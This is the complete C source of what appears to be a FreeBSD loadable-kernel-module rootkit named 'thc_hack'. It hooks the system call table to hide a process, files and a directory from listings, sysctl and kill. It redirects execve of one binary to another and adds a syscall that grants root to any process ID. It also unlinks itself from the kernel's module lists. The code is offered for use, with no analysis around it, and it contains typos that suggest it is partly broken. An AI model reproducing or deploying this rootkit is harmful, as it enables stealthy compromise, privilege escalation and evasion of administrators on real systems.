#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/linker.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/file.h>
#include <sys/malloc.h>
#include <sys/lock.h>
#include <sys/queue.h>
#include <dirent.h>
#include <sys/sysctl.h>
#include "hack_bsd.h"


/*****SUPPORT FUNCTIONS*****/
int 
get_pid()
{
 struct proc *p;
 
 p=allproc.lh_first;
 for (; p!=0; p=p->p_list.le_next)
 {
  if (strcmp(p->p_comm, PROC_TO_HIDE)==0)
  {
   return p->p_pid;
  }
 }
 return -2;
}

int stringcmp(char *s1, char *s2)
{
 int counter, counter2, max, min, equal=-1;
 int l1=strlen(s1), l2=strlen(s2);
 char *maxstr, *minstr;
 
 if (l1>=l2) {max=l1;min=l2;maxstr=s1;minstr=s2;}
 else {max=l2;min=l1;maxstr=s2;minstr=s1;}
 min--; max--;
 for (counter=0; counter<=max; counter++)
 {
  if (maxstr[counter]==minstr[0])
  {
   equal=1;
   for (counter2=1; counter2<=min; counter2++)
   {
    if (maxstr[counter+counter2]!=minstr[counter2]) equal=-1;
   }
   if (equal==1) return 1;
  }
 } 
 return -1;
}


/*****NEW SYSTEM CALLS*****/
static 
void check_code(struct proc *p, struct check_code_args *uap)
{
 if (uap->code==FILE_TO_HIDE_CONTENTS_CODE)
 {
  if (access_uid!=-1) 
   access_uid=-1;
  else
   access_uid=p->p_cred->pc_ucred->cr_uid;
 }
 else 
  access_uid=-1;
}

static int
make_me_root (struct proc *p, struct make_me_root_args *uap)
{
 struct proc *pr=pfind(uap->p_pid);
 
 pr->p_cred->pc_ucred->cr_uid=0; 
 return 0;
}

/*****HACKED SYSTEM CALLS*****/

/**FOR FILE HIDE AND PROCESS HIDING (the procfs part)**/
static int
hacked_getdirentries (struct proc *p, struct getdirentries_args *uap)
{      
 unsigned int tmp, n, t;
 int do_it=0;
 struct dirent *dirp2, *dirp3;
 char hide[]=FILE_TO_HIDE;
 char secure_hide[]=SECURE_DIRECTORY;
 char hide_procfs[10];
 sprintf(hide, "%d", get_pid()); 

 getdirentries(p,uap);
 tmp=p->p_retval[0];
 if (tmp>0)
 { 
  MALLOC(dirp2, struct dirent*, tmp, M_DIRP2, M_NOWAIT);
  copyin(uap->buf, dirp2, tmp);
  dirp3=dirp2;
  t=tmp;
  while (t > 0)
  {
   n = dirp3->d_reclen;
   t-=n;
   do_it=0;
  #ifdef SECURE_MODE
   if (strcmp((char*)&(dirp3->d_name), (char*)&secure_hide)==0) do_it=1;
  #endif
  #ifdef PROC_HIDE
   if (strcmp((char*)&(dirp3->d_name), (char*)&hide_procfs)==0) do_it=1;
  #endif
  #ifdef FILE_HIDE
   if (strcmp((char*)&(dirp3->d_name), (char*)&hide)==0) do_it=1;
  #endif
   if (do_it==1)
   {
    if (t!=0)  
    {
     bcopy((char*)dirp3+n,dirp3, t);
    }
    tmp-=n;
   }
   if (dirp3->d_reclen==0) 
   {
    t=0;
   }
   if (t!=0)
    dirp3=(struct dirent*)((char*)dirp3+dirp3->d_reclen); 
  }
  p->p_retval[0]=tmp; 
  copyout(dirp2, uap->buf, tmp);
  FREE(dirp2, M_DIRP2);
 }
 return	0;
}

/**HACKED OPEN SYSTEM CALL**/
static 
int hacked_open(struct proc *p, struct open_args *uap)
{
 char name[255];
 char hide_name[]=FILE_TO_HIDE_CONTENTS;
 size_t done;

 copyinstr(uap->path, name, 255, &done);
 if (strcmp((char*)&name, (char*)&hide_name)==0)
 {
  if (access_uid==p->p_cred->pc_ucred->cr_uid)
  {
   return open(p, uap);
  }
  else
   return ENOENT;
 }
 return open(p, uap);
}

/*****HACKED KILL SYSTEM CALL*****/
static int
hacked_kill(struct proc *p, struct kill_args *uap)
{
 if (uap->pid==get_pid())
  return ESRCH;
 else
  return kill(p, uap);
}

/*****HACKED SYSCTL SYSTEM CALL*****/
static int
hacked_sysctl(struct proc *p, struct sysctl_args *uap)
{
 int mib[4]; 
 size_t size, newsize;
 struct kinfo_proc kpr; 
 int tmp, counter;

 tmp= __sysctl(p, uap);
 copyin(uap->name, &mib, sizeof(mib)); 
 if (mib[2]==KERN_PROC_PID)
 {
  if (mib[3]==get_pid())
  {
   size=0;
   copyout(&size, uap->oldlenp, sizeof(size));
   return(0); 
  }
  else
   return 0;
 }
 if (mib[0]==CTL_KERN)
  if (mib[1]==KERN_PROC)
   if (uap->old!=NULL)
   {
    if (global_counter==0)
    {
     global_counter++;
     for (counter=0;(counter*sizeof(kpr)<=size); counter++)
     {
      copyin(uap->old+counter*sizeof(kpr), &kpr, sizeof(kpr));
      if (kpr.kp_proc.p_pid==get_pid()) 
      {
       newsize=size-sizeof(kpr); 
       bcopy(uap->old+(counter+1)*sizeof(kpr), uap->old+counter*sizeof(kpr),
             size-(counter+1)*sizeof(kpr));
      }
     }
     copyout(&newsize, uap->oldlenp, sizeof(size));
     return 0;    
    }  
   }
   else
   { 
    copyin(uap->oldlenp, &size, sizeof(size));
    size-=sizeof(kpr)*5;
    newsize=size;
    global_counter=0;
   }
 return tmp; 
}


/*****HACKED EXECVE SYSTEM CALL*****/
static 
int hacked_execve(struct proc *p, struct execve_args *uap)
{
 char name[255];
 char old_name[]=BIN_OLD;
 char new_name[]=BIN_NEW;
 size_t done;
 struct obreak_args oa;
 struct execve_args kap;
 struct execve_aegs *nap;
 char *user_new_name;      

 copyinstr(uap->fname, name, 255, &done);
 if (strcmp((char*)&name, (char*)&old_name)==0)
 {
  oa.nsize=curproc->p_vmspace->vm_daddr+ctob(curproc->p_vmspace->vm_dsize)+
          btoc(1);
  user_new_name=oa.nsize-256;
  copyout(&new_name, user_new_name, strlen(new_name));
  kap.fname=oa.nsize-256;
 
  kap.argv=uap->argv;
  kap.envv=uap->envv;
  nap=(struct execve_args*)oa.nsize-4000;
  copyout(&kap, nap, sizeof(struct execve_args));
  return execve(curproc, nap);
 }
 return execve(p, uap);
}

/*****HACKED CHDIR SYSTEM CALL*****/
static 
int hacked_chdir(struct proc *p, struct chdir_args *uap)
{
 char name[255];
 char hide_name[]=SECURE_DIRECTORY;
 size_t done;

 copyinstr(uap->path, name, 255, &done);
 if (stringcmp(name, hide_name)==1)
 {
  if (access_uid==p->p_cred->pc_ucred->cr_uid)
  {
   return chdir(p, uap);
  }
  else
   return ENOENT;
 }
 return chdir(p, uap);
}


/*****SYSENT STRUCTURES FOR NEW SYSTEM CALLS*****/
static struct sysent check_code_sysent = {
       1,
       check_code
};
static struct sysent make_me_root_sysent = {
	1,			
	make_me_root		
};


/*****SYSENT STRUCTURES FOR HACKED SYSTEM CALLS*****/
static struct sysent hacked_getdirentries_sysent = {
       4,	
        (sy_call_t*)hacked_getdirentries			
};
static struct sysent hacked_open_sysent = {
       3,	
       (sy_call_t*)hacked_open		
};
static struct sysent hacked_kill_sysent = {
       2,
       (sy_call_t*)hacked_kill
};
static struct sysent hacked_sysctl_sysent = {
       6,	
       (sy_call_t*)hacked_sysctl			
};
static struct sysent hacked_execve_sysent = {
       3,	
       (sy_call_t*)hacked_execve			
};
static struct sysent hacked_chdir_sysent = {
       3,	
       (sy_call_t*)hacked_chdir			
};


/*****THE LOAD FUNCTION*****/
static int
dummy_handler (struct module *module, int cmd, void *arg)
{
 int error;

 /*****HIDE FEATURE: Should we hide our module?*****/
#ifdef HIDE
 linker_file_t lf=0;
 module_t mod=0;
 lockmgr(&lock, LK_SHARED, 0, curproc);
 (&files)->tqh_first->refs--;
 for (lf=TAILQ_FIRST(&files); lf; lf=TAILQ_NEXT(lf, link)) 
 {
  if (!strcmp(lf->filename, "hack_bsd.ko"))
  {
   next_file_id--;
   TAILQ_REMOVE(&files, lf, link);
  }
 }
 lockmgr(&lock, LK_RELEASE, 0, curproc);
 for (mod=TAILQ_FIRST(&modules); mod; mod=TAILQ_NEXT(mod, link)) 
 {
  if(!strcmp(mod->name, "mysys"))
  {
   nextid--;
   TAILQ_REMOVE(&modules, mod, link);
  }
 }
#endif
 
 switch (cmd) {
  case MOD_LOAD :
  #ifdef FILE_HIDE
   sysent[SYS_getdirentries]=hacked_getdirentries_sysent;
  #endif
  #ifdef FILE_HIDE_CONTENTS     
   sysent[SYS_open]=hacked_open_sysent;   
   sysent[210]=check_code_sysent;   
  #endif
  #ifdef PROC_HIDE
   sysent[SYS___sysctl]=hacked_sysctl_sysent;
   sysent[SYS_kill]=hacked_kill_sysent;
   sysent[SYS_getdirentries]=hacked_getdirentries_sysent;
  #endif
  #ifdef EXEC_REDIRECTION
   sysent[SYS_execve]=hacked_execve_sysent;
  #endif
  #ifdef ROOTSHELL_BACKDOOR
   sysent[211]=make_me_root_sysent;   
  #endif
  #ifdef SECURE_MODE
   sysent[SYS_chdir]=hacked_chdir_sysent;
  #endif
  break;
  case MOD_UNLOAD :
  #ifdef FILE_HIDE
   sysent[SYS_getdirentries].sy_call=(sy_call_t*)getdirentries;
  #endif
  #ifdef FILE_HIDE_CONTENTS
   sysent[SYS_open].sy_call=(sy_call_t*)open;
  #endif
  #ifdef PROC_HIDE
   sysent[SYS___sysctl].sy_call=(sy_call_t*)__sysctl;
   sysent[SYS_kill].sy_call=(sy_call_t*)kill;
   sysent[SYS_getdirentries].sy_call=(sy_call_t*)getdirentries;
  #endif
  #ifdef EXEC_REDIRECTION
   sysent[SYS_execve].sy_call=(sy_call_t*)execve;
  #endif
  #ifdef SECURE_MODE
   sysent[SYS_chdir].sy_call=(sy_call_t*)chdir;
  #endif
  break;
  default :
   error = EINVAL;
  break;
 }
 return 0;
}

static moduledata_t syscall_mod = {
 "thc_hack", 
 dummy_handler,
 NULL
};

DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);




